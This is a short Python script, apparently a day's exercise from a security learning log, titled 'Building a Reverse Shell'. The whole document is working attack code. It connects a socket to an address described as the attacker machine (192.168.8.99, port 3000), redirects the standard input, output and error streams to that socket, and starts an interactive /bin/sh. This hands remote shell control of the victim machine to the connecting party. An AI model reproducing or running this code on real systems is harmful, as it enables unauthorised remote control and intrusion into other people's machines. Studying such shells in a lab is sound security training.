# Day 34-35: Building a Reverse Shell

import socket

import subprocess

import os

## set up the connection between the attacker and the victim machine
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.8.99", 3000))

# use os functions to access file descriptor input/output/errormessages for socket
os.dup2(s.fileno(), 0)

os.dup2(s.fileno(), 1)

os.dup2(s.fileno(), 2)

# run an interactive shell
p = subprocess.call(["/bin/sh", "-i"])